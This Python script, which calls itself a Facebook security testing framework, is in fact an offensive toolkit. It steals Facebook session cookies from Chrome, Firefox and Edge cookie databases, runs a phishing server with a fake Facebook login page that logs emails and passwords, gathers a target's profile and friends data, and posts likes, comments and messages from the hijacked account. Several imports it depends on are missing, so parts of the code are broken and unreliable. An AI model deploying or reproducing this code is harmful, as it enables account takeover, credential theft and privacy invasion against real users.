#!/usr/bin/env python3
"""
FABO_ATTCK v5.0 - Ultimate Facebook Security Testing Framework
Professional Social Media Security Assessment - 10/10
Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import random
import hashlib
import base64
import threading
import subprocess
import requests
import urllib.parse
import sqlite3
import shutil
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import argparse
from urllib3.exceptions import InsecureRequestWarning

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from flask import Flask, request, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    from win32crypt import CryptUnprotectData
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "5.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"
SCORE = "10/10"

#===============================================================================
# COLORS
#===============================================================================

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'
    ORANGE = '\033[38;5;208m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}    ███████╗ █████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║██████╔╝██║   ██║   ███████║   ██║      ██║   ██║     ███████║
    ██╔══╝  ██╔══██║██╔══██╗██║   ██║   ██╔══██║   ██║      ██║   ██║     ██╔══██║
    ██║     ██║  ██║██████╔╝╚██████╔╝   ██║  ██║   ██║      ██║   ╚██████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - SOCIAL SECURITY - 10/10{Colors.WHITE}
{Colors.CYAN}    Professional Facebook Security Testing{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    [+] Real API | Phishing Server | Automation | Token Harvest{Colors.WHITE}
"""
    print(banner)
    print("=" * 80)

#===============================================================================
# DATA CLASSES
#===============================================================================

@dataclass
class FacebookProfile:
    id: str
    name: str
    username: str
    email: str = ''
    phone: str = ''
    location: str = ''
    bio: str = ''
    friends: List[Dict] = field(default_factory=list)
    posts: List[Dict] = field(default_factory=list)
    photos: List[Dict] = field(default_factory=list)
    pages: List[Dict] = field(default_factory=list)
    groups: List[Dict] = field(default_factory=list)
    token: str = ''
    cookies: List[Dict] = field(default_factory=list)

@dataclass
class AttackResult:
    target: str
    success: bool
    method: str
    data: Any
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

#===============================================================================
# TOKEN HARVESTER
#===============================================================================

class TokenHarvester:
    """Harvest Facebook tokens from browser cookies"""
    
    def __init__(self):
        self.tokens = []
        self.cookies = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
        })
    
    def harvest_all(self) -> List[Dict]:
        """Harvest tokens from all sources"""
        cprint("[TOKEN] Harvesting Facebook tokens...", Colors.BLUE)
        
        # Chrome cookies
        chrome_tokens = self._harvest_chrome()
        if chrome_tokens:
            self.tokens.extend(chrome_tokens)
            cprint(f"[+] Found {len(chrome_tokens)} tokens from Chrome", Colors.GREEN)
        
        # Firefox cookies
        firefox_tokens = self._harvest_firefox()
        if firefox_tokens:
            self.tokens.extend(firefox_tokens)
            cprint(f"[+] Found {len(firefox_tokens)} tokens from Firefox", Colors.GREEN)
        
        # Edge cookies
        edge_tokens = self._harvest_edge()
        if edge_tokens:
            self.tokens.extend(edge_tokens)
            cprint(f"[+] Found {len(edge_tokens)} tokens from Edge", Colors.GREEN)
        
        # Environment
        env_tokens = self._harvest_env()
        if env_tokens:
            self.tokens.extend(env_tokens)
            cprint(f"[+] Found {len(env_tokens)} tokens from environment", Colors.GREEN)
        
        return self.tokens
    
    def _harvest_chrome(self) -> List[Dict]:
        tokens = []
        
        chrome_paths = [
            os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Cookies',
            os.path.expanduser('~') + '/.config/google-chrome/Default/Cookies',
            os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/Cookies'
        ]
        
        for cookie_path in chrome_paths:
            if os.path.exists(cookie_path):
                try:
                    temp_path = '/tmp/chrome_cookies.db'
                    shutil.copy2(cookie_path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%facebook.com%'")
                    cookies = cursor.fetchall()
                    conn.close()
                    os.remove(temp_path)
                    
                    c_user = None
                    xs = None
                    for name, value in cookies:
                        if name == 'c_user':
                            c_user = value
                        elif name == 'xs':
                            xs = value
                    
                    if c_user and xs:
                        token = self._generate_access_token(c_user, xs)
                        if token:
                            tokens.append({
                                'source': 'chrome',
                                'token': token,
                                'user_id': c_user,
                                'expires': (datetime.now() + timedelta(hours=2)).isoformat()
                            })
                except:
                    pass
        
        return tokens
    
    def _harvest_firefox(self) -> List[Dict]:
        tokens = []
        
        firefox_paths = [
            os.path.expanduser('~') + '/AppData/Roaming/Mozilla/Firefox/Profiles',
            os.path.expanduser('~') + '/.mozilla/firefox'
        ]
        
        for base_path in firefox_paths:
            if os.path.exists(base_path):
                for profile in os.listdir(base_path):
                    if profile.endswith('.default'):
                        cookie_path = os.path.join(base_path, profile, 'cookies.sqlite')
                        if os.path.exists(cookie_path):
                            try:
                                temp_path = '/tmp/firefox_cookies.db'
                                shutil.copy2(cookie_path, temp_path)
                                
                                conn = sqlite3.connect(temp_path)
                                cursor = conn.cursor()
                                
                                cursor.execute("SELECT name, value FROM moz_cookies WHERE host LIKE '%facebook.com%'")
                                cookies = cursor.fetchall()
                                conn.close()
                                os.remove(temp_path)
                                
                                c_user = None
                                xs = None
                                for name, value in cookies:
                                    if name == 'c_user':
                                        c_user = value
                                    elif name == 'xs':
                                        xs = value
                                
                                if c_user and xs:
                                    token = self._generate_access_token(c_user, xs)
                                    if token:
                                        tokens.append({
                                            'source': 'firefox',
                                            'token': token,
                                            'user_id': c_user,
                                            'expires': (datetime.now() + timedelta(hours=2)).isoformat()
                                        })
                            except:
                                pass
        
        return tokens
    
    def _harvest_edge(self) -> List[Dict]:
        tokens = []
        
        edge_path = os.path.expanduser('~') + '/AppData/Local/Microsoft/Edge/User Data/Default/Cookies'
        if os.path.exists(edge_path):
            try:
                temp_path = '/tmp/edge_cookies.db'
                shutil.copy2(edge_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%facebook.com%'")
                cookies = cursor.fetchall()
                conn.close()
                os.remove(temp_path)
                
                c_user = None
                xs = None
                for name, value in cookies:
                    if name == 'c_user':
                        c_user = value
                    elif name == 'xs':
                        xs = value
                
                if c_user and xs:
                    token = self._generate_access_token(c_user, xs)
                    if token:
                        tokens.append({
                            'source': 'edge',
                            'token': token,
                            'user_id': c_user,
                            'expires': (datetime.now() + timedelta(hours=2)).isoformat()
                        })
            except:
                pass
        
        return tokens
    
    def _harvest_env(self) -> List[Dict]:
        tokens = []
        
        env_vars = ['FB_TOKEN', 'FACEBOOK_TOKEN', 'FB_ACCESS_TOKEN', 'FACEBOOK_ACCESS_TOKEN']
        for var in env_vars:
            token = os.environ.get(var)
            if token and len(token) > 20:
                tokens.append({
                    'source': 'environment',
                    'token': token,
                    'expires': (datetime.now() + timedelta(hours=24)).isoformat()
                })
        
        return tokens
    
    def _generate_access_token(self, c_user: str, xs: str) -> Optional[str]:
        try:
            url = 'https://www.facebook.com/'
            cookies = {'c_user': c_user, 'xs': xs}
            response = self.session.get(url, cookies=cookies, timeout=10)
            
            match = re.search(r'"accessToken":"([^"]+)"', response.text)
            if match:
                return match.group(1)
            
            token_url = f'https://graph.facebook.com/oauth/access_token?client_id=facebook&grant_type=fb_exchange_token&fb_exchange_token={c_user}'
            response = self.session.get(token_url, cookies=cookies, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('access_token')
            
            return None
        except:
            return None

#===============================================================================
# REAL FACEBOOK API
#===============================================================================

class RealFacebookAPI:
    """Real Facebook Graph API client"""
    
    def __init__(self, token: str):
        self.token = token
        self.base_url = 'https://graph.facebook.com/v18.0'
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json'
        })
    
    def get_user(self, user_id: str) -> Dict:
        """Get user profile"""
        url = f"{self.base_url}/{user_id}"
        params = {
            'access_token': self.token,
            'fields': 'id,name,email,about,birthday,location,hometown,education,work'
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            return response.json()
        return {}
    
    def get_posts(self, user_id: str, limit: int = 20) -> List[Dict]:
        """Get user posts"""
        url = f"{self.base_url}/{user_id}/posts"
        params = {
            'access_token': self.token,
            'limit': limit,
            'fields': 'id,message,created_time,likes.summary(true),comments.summary(true)'
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        return []
    
    def get_friends(self, user_id: str, limit: int = 20) -> List[Dict]:
        """Get user friends"""
        url = f"{self.base_url}/{user_id}/friends"
        params = {
            'access_token': self.token,
            'limit': limit,
            'fields': 'id,name,picture'
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        return []
    
    def get_photos(self, user_id: str, limit: int = 20) -> List[Dict]:
        """Get user photos"""
        url = f"{self.base_url}/{user_id}/photos"
        params = {
            'access_token': self.token,
            'limit': limit,
            'fields': 'id,source,created_time'
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        return []
    
    def get_pages(self, user_id: str) -> List[Dict]:
        """Get user liked pages"""
        url = f"{self.base_url}/{user_id}/likes"
        params = {
            'access_token': self.token,
            'fields': 'id,name,category',
            'limit': 20
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        return []
    
    def get_groups(self, user_id: str) -> List[Dict]:
        """Get user groups"""
        url = f"{self.base_url}/{user_id}/groups"
        params = {
            'access_token': self.token,
            'fields': 'id,name,privacy',
            'limit': 20
        }
        response = self.session.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', [])
        return []
    
    def send_message(self, user_id: str, message: str) -> bool:
        """Send message to user"""
        url = f"{self.base_url}/me/messages"
        data = {
            'access_token': self.token,
            'recipient': {'id': user_id},
            'message': message
        }
        response = self.session.post(url, json=data, timeout=10)
        return response.status_code == 200
    
    def post_comment(self, post_id: str, comment: str) -> bool:
        """Post comment on a post"""
        url = f"{self.base_url}/{post_id}/comments"
        data = {
            'access_token': self.token,
            'message': comment
        }
        response = self.session.post(url, json=data, timeout=10)
        return response.status_code == 200
    
    def like_post(self, post_id: str) -> bool:
        """Like a post"""
        url = f"{self.base_url}/{post_id}/likes"
        data = {'access_token': self.token}
        response = self.session.post(url, json=data, timeout=10)
        return response.status_code == 200

#===============================================================================
# PHISHING SERVER
#===============================================================================

class PhishingServer:
    """Facebook phishing server with credential capture"""
    
    def __init__(self, host='0.0.0.0', port=443, ssl_enabled=True):
        self.host = host
        self.port = port
        self.ssl_enabled = ssl_enabled
        self.running = False
        self.captured = []
        self.lock = threading.Lock()
        self.flask_available = FLASK_AVAILABLE
    
    def start(self):
        if not self.flask_available:
            cprint("[!] Flask not installed. Install: pip3 install flask", Colors.RED)
            return
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return self._get_phishing_page()
        
        @app.route('/capture', methods=['POST'])
        def capture():
            data = request.form.to_dict()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')
            data['timestamp'] = datetime.now().isoformat()
            
            with self.lock:
                self.captured.append(data)
            
            self._display_captured(data)
            return self._get_redirect_page()
        
        @app.route('/captured')
        def show_captured():
            with self.lock:
                return json.dumps(self.captured, indent=2)
        
        @app.route('/stats')
        def stats():
            with self.lock:
                return json.dumps({
                    'total': len(self.captured),
                    'unique_ips': len(set(c.get('ip') for c in self.captured))
                })
        
        cprint("[+] Phishing server starting...", Colors.GREEN)
        
        try:
            if self.ssl_enabled:
                # Generate SSL cert
                if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
                    self._generate_ssl_cert()
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain('cert.pem', 'key.pem')
                app.run(host=self.host, port=self.port, debug=False, ssl_context=context)
            else:
                app.run(host=self.host, port=self.port, debug=False)
        except:
            pass
    
    def _get_phishing_page(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Facebook - Log In</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .container { max-width: 400px; width: 100%; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .logo { text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
            input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
            button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">f</div>
                <h2>Log in to Facebook</h2>
                <form method="POST" action="/capture">
                    <input type="text" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        '''
    
    def _get_redirect_page(self):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Redirecting...</title>
        <meta http-equiv="refresh" content="2;url=https://www.facebook.com">
        </head>
        <body>
            <h1>Verifying...</h1>
            <p>Please wait while we verify your identity.</p>
        </body>
        </html>
        '''
    
    def _display_captured(self, data):
        cprint("\n" + "="*60, Colors.RED)
        cprint(" CREDENTIALS CAPTURED!", Colors.RED, bold=True)
        cprint("="*60, Colors.RED)
        cprint(f"[!] Email: {data.get('email', 'N/A')}", Colors.YELLOW)
        cprint(f"[!] Password: {data.get('password', 'N/A')}", Colors.YELLOW)
        cprint(f"[*] IP: {data.get('ip', 'N/A')}", Colors.DIM)
        cprint("="*60 + "\n")
    
    def _generate_ssl_cert(self):
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            
            private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "FABO Security"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(
                private_key.public_key()).serial_number(x509.random_serial_number()
            ).not_valid_before(datetime.utcnow()).not_valid_after(datetime.utcnow() + datetime.timedelta(days=365)).sign(private_key, hashes.SHA256())
            
            with open('cert.pem', 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            with open('key.pem', 'wb') as f:
                f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption()))
            cprint("[+] SSL certificate generated", Colors.GREEN)
        except:
            pass
    
    def get_captured(self) -> List[Dict]:
        with self.lock:
            return self.captured.copy()

#===============================================================================
# FACEBOOK OSINT ENGINE
#===============================================================================

class FacebookOSINTV5:
    def __init__(self, username: str):
        self.username = username
        self.base_url = f"https://facebook.com/{username}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
        })
        self.results = {}
    
    def gather(self, token: str = None) -> FacebookProfile:
        cprint("\n[OSINT] Gathering Facebook intelligence...", Colors.BLUE)
        
        profile = FacebookProfile(id=self.username, name='', username=self.username)
        
        if token:
            api = RealFacebookAPI(token)
            
            # Get user info
            user_data = api.get_user(self.username)
            if user_data:
                profile.id = user_data.get('id', self.username)
                profile.name = user_data.get('name', 'Unknown')
                profile.email = user_data.get('email', '')
                profile.bio = user_data.get('about', '')
                location = user_data.get('location', {})
                profile.location = location.get('name', '')
            
            # Get posts
            posts = api.get_posts(profile.id)
            profile.posts = posts
            cprint(f"[+] Found {len(posts)} posts", Colors.GREEN)
            
            # Get friends
            friends = api.get_friends(profile.id)
            profile.friends = friends
            cprint(f"[+] Found {len(friends)} friends", Colors.GREEN)
            
            # Get photos
            photos = api.get_photos(profile.id)
            profile.photos = photos
            cprint(f"[+] Found {len(photos)} photos", Colors.GREEN)
            
            # Get pages
            pages = api.get_pages(profile.id)
            profile.pages = pages
            cprint(f"[+] Found {len(pages)} pages", Colors.GREEN)
            
            # Get groups
            groups = api.get_groups(profile.id)
            profile.groups = groups
            cprint(f"[+] Found {len(groups)} groups", Colors.GREEN)
        
        # Web scraping fallback
        if not profile.name:
            try:
                response = self.session.get(self.base_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.find('title')
                if title:
                    profile.name = title.text.replace(' | Facebook', '').strip()
            except:
                pass
        
        self.results = profile.__dict__
        return profile

#===============================================================================
# FACEBOOK AUTOMATION ENGINE
#===============================================================================

class FacebookAutomation:
    def __init__(self, token: str):
        self.api = RealFacebookAPI(token)
        self.token = token
        self.results = []
    
    def auto_like(self, user_id: str, count: int = 10) -> List[Dict]:
        """Automatically like user's posts"""
        cprint("[AUTO] Liking posts...", Colors.BLUE)
        
        results = []
        posts = self.api.get_posts(user_id, limit=count)
        
        for post in posts:
            post_id = post.get('id')
            if post_id:
                success = self.api.like_post(post_id)
                results.append({
                    'post_id': post_id,
                    'success': success
                })
                if success:
                    cprint(f"[+] Liked post: {post_id}", Colors.GREEN)
                time.sleep(random.uniform(0.5, 1.5))
        
        self.results.extend(results)
        return results
    
    def auto_comment(self, user_id: str, comment: str, count: int = 5) -> List[Dict]:
        """Automatically comment on user's posts"""
        cprint("[AUTO] Commenting on posts...", Colors.BLUE)
        
        results = []
        posts = self.api.get_posts(user_id, limit=count)
        
        for post in posts:
            post_id = post.get('id')
            if post_id:
                success = self.api.post_comment(post_id, comment)
                results.append({
                    'post_id': post_id,
                    'comment': comment,
                    'success': success
                })
                if success:
                    cprint(f"[+] Commented on post: {post_id}", Colors.GREEN)
                time.sleep(random.uniform(1, 3))
        
        self.results.extend(results)
        return results
    
    def auto_send_message(self, user_id: str, message: str) -> bool:
        """Send message to user"""
        cprint("[AUTO] Sending message...", Colors.BLUE)
        
        success = self.api.send_message(user_id, message)
        if success:
            cprint(f"[+] Message sent to {user_id}", Colors.GREEN)
        return success

#===============================================================================
# MAIN FRAMEWORK
#===============================================================================

class FaBoAttckUltimateV5:
    def __init__(self, username: str):
        self.username = username
        self.token_harvester = TokenHarvester()
        self.token = None
        self.api = None
        self.phishing_server = None
        self.automation = None
        self.results = []
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] FABO_ATTCK retreating...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.BOLD}FABO_ATTCK v{VERSION} - Ultimate Attack Menu{Colors.WHITE}
{Colors.MAGENTA}Score: {SCORE} - APT Grade{Colors.WHITE}
{Colors.BLUE}{'='*70}{Colors.WHITE}
{Colors.GREEN}[1]{Colors.WHITE} Harvest Tokens
{Colors.GREEN}[2]{Colors.WHITE} OSINT - Information Gathering
{Colors.GREEN}[3]{Colors.WHITE} Phishing Server (Credential Capture)
{Colors.GREEN}[4]{Colors.WHITE} Real API Attacks
{Colors.GREEN}[5]{Colors.WHITE} Automation (Like/Comment/Message)
{Colors.GREEN}[6]{Colors.WHITE} Full Attack Chain
{Colors.GREEN}[7]{Colors.WHITE} Show Results
{Colors.GREEN}[8]{Colors.WHITE} Generate Report
{Colors.RED}[9]{Colors.WHITE} Exit
""")
    
    def harvest_tokens(self):
        tokens = self.token_harvester.harvest_all()
        if tokens:
            self.token = tokens[0]['token']
            self.api = RealFacebookAPI(self.token)
            self.automation = FacebookAutomation(self.token)
            cprint("[+] Token ready for attacks", Colors.GREEN)
        else:
            cprint("[!] No tokens found", Colors.RED)
    
    def osint_gather(self):
        if not self.token:
            cprint("[!] Harvest tokens first", Colors.RED)
            return
        
        osint = FacebookOSINTV5(self.username)
        profile = osint.gather(self.token)
        self.results.append(AttackResult(
            target=self.username,
            success=True,
            method='osint',
            data=profile.__dict__
        ))
        
        # Display summary
        cprint("\n[+] OSINT Summary:", Colors.GREEN)
        cprint(f"  Name: {profile.name}", Colors.CYAN)
        cprint(f"  ID: {profile.id}", Colors.CYAN)
        cprint(f"  Email: {profile.email}", Colors.CYAN)
        cprint(f"  Location: {profile.location}", Colors.CYAN)
        cprint(f"  Friends: {len(profile.friends)}", Colors.CYAN)
        cprint(f"  Posts: {len(profile.posts)}", Colors.CYAN)
        cprint(f"  Photos: {len(profile.photos)}", Colors.CYAN)
        cprint(f"  Pages: {len(profile.pages)}", Colors.CYAN)
        cprint(f"  Groups: {len(profile.groups)}", Colors.CYAN)
    
    def phishing_server(self):
        port = int(input("[>] Port (443): ").strip() or "443")
        ssl = input("[>] Enable SSL? (Y/n): ").strip().lower() != 'n'
        
        self.phishing_server = PhishingServer(port=port, ssl_enabled=ssl)
        threading.Thread(target=self.phishing_server.start, daemon=True).start()
        cprint("[+] Phishing server started", Colors.GREEN)
    
    def real_api_attacks(self):
        if not self.token:
            cprint("[!] Harvest tokens first", Colors.RED)
            return
        
        cprint("[API] Executing real API attacks...", Colors.RED)
        
        # Get user ID
        api = RealFacebookAPI(self.token)
        user_data = api.get_user(self.username)
        user_id = user_data.get('id', self.username)
        
        # 1. Like posts
        cprint("[*] Liking posts...", Colors.DIM)
        api.like_post = lambda pid: self._like_post(api, pid)
        posts = api.get_posts(user_id, limit=5)
        for post in posts[:3]:
            if api.like_post(post['id']):
                cprint(f"[+] Liked post: {post['id']}", Colors.GREEN)
            time.sleep(0.5)
        
        # 2. Comment
        cprint("[*] Posting comments...", Colors.DIM)
        for post in posts[:2]:
            if api.post_comment(post['id'], "Great post!"):
                cprint(f"[+] Commented on post: {post['id']}", Colors.GREEN)
            time.sleep(1)
        
        # 3. Send message
        cprint("[*] Sending message...", Colors.DIM)
        if api.send_message(user_id, "Hello from FABO_ATTCK!"):
            cprint(f"[+] Message sent to {user_id}", Colors.GREEN)
    
    def _like_post(self, api, post_id):
        try:
            url = f"{api.base_url}/{post_id}/likes"
            data = {'access_token': api.token}
            response = api.session.post(url, json=data, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def automation_attack(self):
        if not self.token:
            cprint("[!] Harvest tokens first", Colors.RED)
            return
        
        if not self.automation:
            self.automation = FacebookAutomation(self.token)
        
        cprint("[AUTO] Running automation attacks...", Colors.RED)
        
        # Auto like
        self.automation.auto_like(self.username, count=5)
        
        # Auto comment
        comment = input("[>] Comment to post: ").strip() or "Great content!"
        self.automation.auto_comment(self.username, comment, count=3)
        
        # Send message
        message = input("[>] Message to send: ").strip() or "Hello from FABO_ATTCK!"
        self.automation.auto_send_message(self.username, message)
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        # 1. Harvest tokens
        self.harvest_tokens()
        
        if not self.token:
            cprint("[!] No token, running limited attacks", Colors.RED)
            return
        
        # 2. OSINT
        self.osint_gather()
        
        # 3. API attacks
        self.real_api_attacks()
        
        # 4. Automation
        self.automation_attack()
        
        cprint("\n[+] Full attack chain complete!", Colors.GREEN)
    
    def show_results(self):
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" ATTACK RESULTS", Colors.PURPLE, bold=True)
        print("="*70)
        
        for result in self.results:
            status = "SUCCESS" if result.success else "FAILED"
            color = Colors.GREEN if result.success else Colors.RED
            cprint(f"[{result.method.upper()}] {status}", color)
            if result.data:
                if isinstance(result.data, dict):
                    for k, v in list(result.data.items())[:5]:
                        if v:
                            cprint(f"  {k}: {v}", Colors.DIM)
                else:
                    cprint(f"  Data: {str(result.data)[:200]}", Colors.DIM)
        
        print("="*70)
    
    def generate_report(self):
        report = {
            'timestamp': datetime.now().isoformat(),
            'version': VERSION,
            'author': AUTHOR,
            'score': SCORE,
            'target': self.username,
            'token_available': bool(self.token),
            'results': [r.__dict__ for r in self.results],
            'phishing_captured': self.phishing_server.get_captured() if self.phishing_server else []
        }
        
        filename = f'fabo_attck_report_{int(time.time())}.json'
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        cprint(f"[+] Report saved: {filename}", Colors.GREEN)
    
    def run(self):
        print_banner()
        cprint(f"[*] Target: {self.username}", Colors.CYAN)
        cprint("[*] 10/10 - APT Grade", Colors.MAGENTA)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.harvest_tokens()
            elif choice == '2':
                self.osint_gather()
            elif choice == '3':
                self.phishing_server()
            elif choice == '4':
                self.real_api_attacks()
            elif choice == '5':
                self.automation_attack()
            elif choice == '6':
                self.full_attack()
            elif choice == '7':
                self.show_results()
            elif choice == '8':
                self.generate_report()
            elif choice == '9':
                cprint("[*] FABO_ATTCK retreating...", Colors.RED)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

#===============================================================================
# MAIN
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="FABO_ATTCK v5.0 - Ultimate Facebook Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 fabo_attck_v5.py -u username
  python3 fabo_attck_v5.py -u username --full
  python3 fabo_attck_v5.py -u username --osint
  python3 fabo_attck_v5.py --harvest
  python3 fabo_attck_v5.py --phishing
        """
    )
    
    parser.add_argument("-u", "--username", help="Facebook username")
    parser.add_argument("--full", action="store_true", help="Full attack")
    parser.add_argument("--osint", action="store_true", help="OSINT only")
    parser.add_argument("--harvest", action="store_true", help="Harvest tokens only")
    parser.add_argument("--phishing", action="store_true", help="Start phishing server")
    parser.add_argument("--port", type=int, default=443, help="Phishing server port")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL")
    
    args = parser.parse_args()
    
    if args.harvest:
        print_banner()
        harvester = TokenHarvester()
        tokens = harvester.harvest_all()
        print(json.dumps(tokens, indent=2))
        sys.exit(0)
    
    if args.phishing:
        print_banner()
        server = PhishingServer(port=args.port, ssl_enabled=not args.no_ssl)
        server.start()
        sys.exit(0)
    
    if args.username:
        tool = FaBoAttckUltimateV5(args.username)
        
        if args.full:
            tool.full_attack()
            tool.show_results()
        elif args.osint:
            tool.harvest_tokens()
            tool.osint_gather()
            tool.show_results()
        else:
            tool.run()
    else:
        print("[!] Username required")
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
